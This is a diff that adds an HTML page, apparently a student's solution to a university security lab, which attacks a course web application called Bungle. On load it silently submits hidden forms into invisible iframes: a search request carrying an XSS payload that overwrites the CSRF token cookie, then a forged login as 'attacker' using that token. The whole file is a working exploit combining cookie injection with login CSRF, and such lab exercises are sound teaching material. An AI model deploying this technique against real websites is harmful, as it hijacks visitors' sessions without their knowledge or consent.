@@ -1,0 +1,28 @@
+<html>
+  <head>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  </head>
+
+ <!-- md5(yyang192) = f52de56fe5204e81bfc90efd3b360f3; -->
+  <body>
+    <form action='http://bungle-cs461.csl.illinois.edu/search?csrfdefense=1&xssdefense=0' method='GET' target="hiddenframe" name="searchform" id="searchform">
+      <input type="hidden" name="q" value="<script>document.cookie='csrf_token=f52de56fe5204e81bfc90efd3b360f'</script>"  />
+    </form>
+    <form action='http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0' method='POST' target="hiddenframe2" name="loginform" id="loginform">
+      <input type="hidden" name="username" value="attacker"  />
+      <input type="hidden" name="password" value="l33th4x"  />
+      <input type="hidden" name="csrf_token" value="f52de56fe5204e81bfc90efd3b360f"  />
+    </form>
+
+    <iframe name="hiddenframe" style="display: none;" height=500 width=1000></iframe>
+    <iframe name="hiddenframe2" style="display: none;" height=500 width=1000></iframe>
+  </body>
+
+  <script>
+    document.getElementById("searchform").submit();
+    document.getElementById("loginform").submit();
+  </script>
+</html>
+
+
